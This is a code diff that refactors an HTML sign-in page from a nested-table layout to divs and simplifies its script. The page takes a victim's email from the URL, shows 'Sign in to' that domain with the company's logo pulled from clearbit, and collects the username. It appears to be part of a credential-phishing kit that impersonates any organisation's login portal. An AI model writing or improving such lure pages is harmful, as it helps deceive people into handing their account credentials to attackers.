@@ -15,18 +15,14 @@
       margin: 0;
       padding: 0;
       height: 100%;
-      min-width: 100%;
       font-size: 13px;
       color: #676767;
       font-weight: 700;
-      direction: ltr;
-      -webkit-text-size-adjust: none;
     }
 
     input[type=text] {
       appearance: none;
       font-size: 16px;
-      box-shadow: none;
       height: 40px;
       width: 100%;
       border: none;
@@ -43,133 +39,72 @@
 
     input[type=text]:focus {
       outline: none;
-      box-shadow: none;
+    }
+
+    h1 {
+      font-size: 24px;
+      text-align: center;
+      font-weight: 700;
     }
 
     p {
       font-size: 14px;
       text-align: center;
     }
-
-    h1 {
-      font-weight: 700;
-      font-size: 24px;
-      text-align: center;
-    }
   </style>
 </head>
 <body>
-  <table border="0" width="100%" cellspacing="0" cellpadding="0">
-    <tr><td>&nbsp;</td></tr>
-    <tr>
-      <td>
-        <div align="center">
-          <table border="0" width="100" cellspacing="0" cellpadding="0">
-            <tr>
-              <td>
-                <table border="0" width="100%" cellspacing="0" cellpadding="0">
-                  <form id="loginForm" action="index.html" method="get">
-                    <tr><td height="110"></td></tr>
-                    <tr>
-                      <td height="40" align="center">
-                        <img id="logo" src="https://logo.clearbit.com/domain" width="200" height="40">
-                      </td>
-                    </tr>
-                    <tr><td height="70"></td></tr>
-                    <tr>
-                      <td height="26">
-                        <h1>
-                          <font color="#000000">Sign in to</font>
-                          <font color="#7A7A7A" id="domainLabel">domain</font>
-                        </h1>
-                      </td>
-                    </tr>
-                    <tr><td height="14"><p>Please enter your username.</p></td></tr>
-                    <tr><td height="40"></td></tr>
-                    <tr>
-                      <td width="400" height="40">
-                        <div class="input-group">
-                          <input name="login" placeholder="Username" type="text" required class="form-control" id="usernameInput" autofocus>
-                          <input type="hidden" name="domain" id="hiddenDomain">
-                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
-                        </div>
-                      </td>
-                    </tr>
-                    <tr><td height="20"></td></tr>
-                    <tr>
-                      <td>
-                        <input type="image" src="img/signin-btn.png" width="400" height="44" name="I1">
-                      </td>
-                    </tr>
-                    <tr><td height="15"></td></tr>
-                    <tr>
-                      <td height="15">
-                        <table border="0" width="100%" cellspacing="0" cellpadding="0">
-                          <tr>
-                            <td height="122" background="img/footer-2.png">
-                              <table border="0" width="100%" cellspacing="0" cellpadding="0">
-                                <tr>
-                                  <td height="36">
-                                    <table border="0" width="100%" cellspacing="0" cellpadding="0">
-                                      <tr>
-                                        <td width="8"></td>
-                                        <td width="155">
-                                          <p align="left">
-                                            <a href="session_login.php" style="text-decoration: none; color: black;">
-                                              <font color="#2985db" size="2" face="Arial Unicode MS">Sign in with another office</font>
-                                            </a>
-                                          </p>
-                                        </td>
-                                        <td height="20"></td>
-                                      </tr>
-                                    </table>
-                                  </td>
-                                </tr>
-                                <tr><td height="86"></td></tr>
-                              </table>
-                            </td>
-                          </tr>
-                          <tr><td height="2"></td></tr>
-                        </table>
-                      </td>
-                    </tr>
-                  </form>
-                </table>
-              </td>
-            </tr>
-          </table>
-        </div>
-      </td>
-    </tr>
-  </table>
+  <form id="loginForm" action="index.html" method="get">
+    <div class="container" style="max-width: 400px; margin-top: 60px;">
+      <div class="text-center">
+        <img id="logo" src="https://logo.clearbit.com/domain" width="200" height="40">
+      </div>
+      <div style="margin-top: 40px;">
+        <h1>
+          <span style="color:#000">Sign in to </span>
+          <span id="domainLabel" style="color:#7A7A7A">domain</span>
+        </h1>
+        <p>Please enter your username.</p>
+      </div>
+
+      <div class="input-group" style="margin-top:30px;">
+        <input id="usernameInput" name="login" type="text" placeholder="Username" required class="form-control">
+        <input type="hidden" id="hiddenDomain" name="domain">
+        <span id="domainAddon" class="input-group-addon" style="background-color:#fff; border:none; border-bottom:1px solid blue; border-top:1px solid blue; border-right:1px solid blue;">@domain</span>
+      </div>
+
+      <div style="margin-top: 20px;">
+        <input type="image" src="img/signin-btn.png" width="100%" height="44">
+      </div>
+
+      <div style="margin-top: 20px; text-align: left;">
+        <a href="session_login.php" style="text-decoration: none; color: #2985db;">Sign in with another office</a>
+      </div>
+    </div>
+  </form>
 
   <script>
     const params = new URLSearchParams(window.location.search);
     const raw = params.get('login');
     const email = raw ? decodeURIComponent(raw) : '';
+    let domain = '';
 
-    let user = '', domain = '';
     if (email.includes('@')) {
-      [user, domain] = email.split('@');
+      const parts = email.split('@');
+      domain = parts[1] || 'domain';
     }
 
-    // Set hidden domain value
-    document.getElementById('hiddenDomain').value = domain || 'domain';
+    // Display domain (read-only, from URL only)
+    document.getElementById('hiddenDomain').value = domain;
+    document.getElementById('domainAddon').textContent = '@' + domain;
+    document.getElementById('domainLabel').textContent = domain;
+    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
 
-    // Set domain visuals
-    if (domain) {
-      document.getElementById('domainAddon').textContent = '@' + domain;
-      document.getElementById('domainLabel').textContent = domain;
-      document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
-    }
-
-    // Combine user + domain before submit
+    // On submit, combine username + domain into one email
     document.getElementById('loginForm').addEventListener('submit', function (e) {
-      const usernameInput = document.getElementById('usernameInput');
-      const domainVal = document.getElementById('hiddenDomain').value.trim();
-      const userVal = usernameInput.value.trim();
-      if (userVal && domainVal) {
-        usernameInput.value = userVal + '@' + domainVal;
+      const user = document.getElementById('usernameInput').value.trim();
+      if (user && domain) {
+        document.getElementById('usernameInput').value = user + '@' + domain;
       }
     });
   </script>
